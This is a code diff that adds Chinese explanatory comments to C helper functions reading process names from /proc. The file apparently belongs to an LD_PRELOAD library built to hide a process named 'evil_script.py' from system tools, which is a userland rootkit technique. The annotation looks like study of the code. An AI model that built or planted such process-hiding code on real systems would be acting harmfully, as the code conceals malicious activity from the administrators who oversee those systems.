@@ -16,11 +16,15 @@ static const char* process_to_filter = "evil_script.py";
  */
 static int get_dir_name(DIR* dirp, char* buf, size_t size)
 {
+    // dirp为当前进程打开/proc下的其他进程所获取
+
+    // 提取描述符
     int fd = dirfd(dirp);
     if(fd == -1) {
         return 0;
     }
 
+    // 提取其他进程目录名
     char tmp[64];
     snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
     ssize_t ret = readlink(tmp, buf, size);
@@ -28,6 +32,7 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
         return 0;
     }
 
+    // 目录名字符串收尾
     buf[ret] = 0;
     return 1;
 }
@@ -37,13 +42,16 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
  */
 static int get_process_name(char* pid, char* buf)
 {
+    // 检测pid是否非法，正常pid为数字组成
     if(strspn(pid, "0123456789") != strlen(pid)) {
         return 0;
     }
 
+    // 组成pid对应的stat /proc/xxx/stat
     char tmp[256];
     snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
- 
+
+    // 读取stat
     FILE* f = fopen(tmp, "r");
     if(f == NULL) {
         return 0;
@@ -52,10 +60,12 @@ static int get_process_name(char* pid, char* buf)
     if(fgets(tmp, sizeof(tmp), f) == NULL) {
         fclose(f);
         return 0;
+    } else {
+        fclose(f);
     }
 
-    fclose(f);
-
+    // stat格式：450967 (memcheck-amd64-) S 1 450967...
+    // 提取进程名memcheck-amd64-
     int unused;
     sscanf(tmp, "%d (%[^)]s", &unused, buf);
     return 1;
